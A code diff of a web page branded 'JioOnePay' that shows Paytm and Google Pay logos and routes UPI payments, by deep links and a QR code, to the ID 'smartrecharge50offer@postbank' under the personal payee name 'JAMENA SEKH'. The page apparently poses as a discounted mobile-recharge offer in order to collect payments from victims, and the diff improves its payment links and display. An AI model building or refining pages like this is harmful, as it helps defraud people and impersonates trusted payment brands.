@@ -66,7 +66,7 @@
         .jioonepay-text {
             font-size: 18px;
             font-weight: 700;
-            color: #ffffff; /* Red color for JioOnePay */
+            color: #ffffff; /* Red color for JioOnePay in header */
         }
 
         .header-right {
@@ -205,7 +205,7 @@
             color: #555;
             margin-bottom: 10px;
         }
-        .qr-amount-display {
+        .qr-info-display {
             font-weight: bold;
             color: #000;
             margin-top: 5px;
@@ -249,14 +249,15 @@
         </a>
         <a href="#" class="option-item" id="paytm-option">
             <div class="option-icon paytm">
-                <img src="https://lh3.googleusercontent.com/bJZifQXgUTjdpawYz-cIjj5WHLSijgbLpxAhKg9nRB_73R8ZOdaJE9Bcb3gxk98-kPaBoO_I=w46-h46-c0x00ffffff-rj" alt="Paytm Logo">
+                <!-- Updated Paytm Logo URL -->
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT1-UvppbnMZIjBK7l0xJFBqyuyX7uVj0PL4mA_XPawYg&amp;s" alt="Paytm Logo">
             </div>
             <span class="option-text">Paytm</span>
             <div class="arrow-icon"></div>
         </a>
         <a href="#" class="option-item" id="googlepay-option">
             <div class="option-icon googlepay">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTnktVGHQGmjG9JLRGB-fSyDtC6SkxPDoPldx2_pL2w5wXaMC2GkRLZcKOvXzznjsd7TvXuCSrYCQPFGsZ-r0_F2M1UQL0GtErL2AJnaSQY" alt="Google Pay Logo">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsXIWYADPXxfRhfIdLCQWqM94Y-7FHTAzhE970SB7UyLlaueEFvE8Bct4&amp;s=10" alt="Google Pay Logo">
             </div>
             <span class="option-text">Google Pay</span>
             <div class="arrow-icon"></div>
@@ -279,7 +280,7 @@
         <a href="#" class="option-item" id="qr-code-option">
             <div class="option-icon qrcode">
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M3 11H5V13H3V11ZM11 11H13V13H11V11ZM17 11H19V13H17V11ZM3 15H5V17H3V15ZM7 15H9V17H7V15ZM11 15H13V17H11V15ZM15 15H17V17H15V15ZM3 19H5V21H3V19ZM7 19H9V21H7V19ZM11 19H13V21H11V19ZM15 19H17V21H15V19ZM19 19H21V21H19V19ZM19 3H21V5H19V3ZM19 7H21V9H19V7ZM19 11H21V13H19V11ZM19 15H21V17H19V15ZM15 3H17V5H15V3ZM15 7H17V9H15V7ZM15 11H17V13H15V11ZM11 3H13V5H11V3ZM11 7H13V9H11V7ZM11 11H13V13H11V11ZM7 3H9V5H7V3ZM7 7H9V9H7V7ZM7 11H9V13H7V11ZM3 3H5V5H3V3ZM3 7H5V9H3V7ZM3 11H5V13H3V11Z" fill="#28A745"/>
+                    <path d="M3 11H5V13H3V11ZM11 11H13V13H11V11ZM17 11H19V13H17V11ZM3 15H5V17H3V15ZM7 15H9V17H7V15ZM11 15H13V17H11V15ZM15 15H17V17H15V15ZM3 19H5V21H3V19ZM7 19H9V21H7V19ZM11 19H13V21H11V19ZM15 19H17V21H15V19ZM19 19H21V21H19V19ZM19 3H21V5H19V3ZM19 7H21V9H19V7ZM19 11H21V13H19V11ZM19 15H21V17H19V15ZM15 3H17V5H15V3ZM15 7H17V9H15V7ZM15 11H17V13H15V11ZM11 3H13V5H11V3ZM11 7H13V9H11V7ZM11 11H13V13H11V11ZM7 3H9V5H7V3ZM7 7H9V9H7V7ZM7 11H9V13H7V11ZM3 3H5V5H3V3ZM3 7H9V9H3V7ZM3 11H5V13H3V11Z" fill="#28A745"/>
                 </svg>
             </div>
             <span class="option-text">Pay via QR Code</span>
@@ -290,7 +291,8 @@
     <div id="qrCodeSection">
         <p>Scan this QR code with any UPI app</p>
         <canvas id="qrCodeCanvas"></canvas>
-        <span class="qr-amount-display" id="qrAmountDisplay">Amount: ₹0.00</span>
+        <span class="qr-info-display" id="qrUpiIdDisplay">UPI ID: smartrecharge50offer@postbank</span>
+        <span class="qr-info-display" id="qrAmountDisplay">Amount: ₹0.00</span>
     </div>
 
     <div class="footer">
@@ -299,6 +301,7 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            // Default UPI ID and remark
             const upiId = 'smartrecharge50offer@postbank';
             const defaultAmount = '0.00';
             const defaultRemark = 'JioOnePay'; // Default remark/coupon
@@ -320,18 +323,29 @@
             document.getElementById('amountPayable').textContent = `₹${currentAmount}`;
             // Update QR code section amount display
             document.getElementById('qrAmountDisplay').textContent = `Amount: ₹${currentAmount}`;
+            document.getElementById('qrUpiIdDisplay').textContent = `UPI ID: ${upiId}`;
+
 
             // Generate UPI links with dynamic data
             function generateUpiLink(scheme) {
-                // Ensure remark is properly URL-encoded
                 const encodedRemark = encodeURIComponent(currentRemark);
+                // mc (Merchant Code) is optional but good to include if available
                 const base = `pa=${upiId}&pn=JAMENA%20SEKH&tn=${encodedRemark}&am=${currentAmount}&cu=INR`;
                 
-                // Specific scheme handling if needed (e.g., Google Pay uses 'tez')
-                if (scheme === 'tez') {
-                    return `tez://upi/pay?${base}`;
-                } else {
-                    return `${scheme}://upi/pay?${base}`;
+                switch(scheme) {
+                    case 'phonepe':
+                        // PhonePe specific scheme. Sometimes just 'phonepe://pay' followed by params works.
+                        // However, a direct 'upi://pay' often works better to open the app with details.
+                        // Trying a common approach for PhonePe.
+                        return `phonepe://pay?${base}`;
+                    case 'paytm':
+                        // Paytm specific scheme. 'paytmmp://pay' is common.
+                        return `paytmmp://pay?${base}`;
+                    case 'tez': // Google Pay
+                        return `tez://upi/pay?${base}`;
+                    case 'upi': // Generic UPI
+                    default:
+                        return `upi://pay?${base}`;
                 }
             }
 
@@ -367,7 +381,6 @@
             const qrCodeSection = document.getElementById('qrCodeSection');
             document.getElementById('qr-code-option').addEventListener('click', function(e) {
                 e.preventDefault();
-                // Toggle visibility
                 if (qrCodeSection.style.display === 'none' || qrCodeSection.style.display === '') {
                     qrCodeSection.style.display = 'block';
                     generateQRCode(); // Generate QR when shown
@@ -377,7 +390,8 @@
             });
 
             function generateQRCode() {
-                const upiQrData = links.allUpi; // Use the generic UPI link for QR
+                // Use the generic UPI link for QR code data
+                const upiQrData = links.allUpi; 
                 QRCode.toCanvas(document.getElementById('qrCodeCanvas'), upiQrData, {
                     width: 200,
                     height: 200,
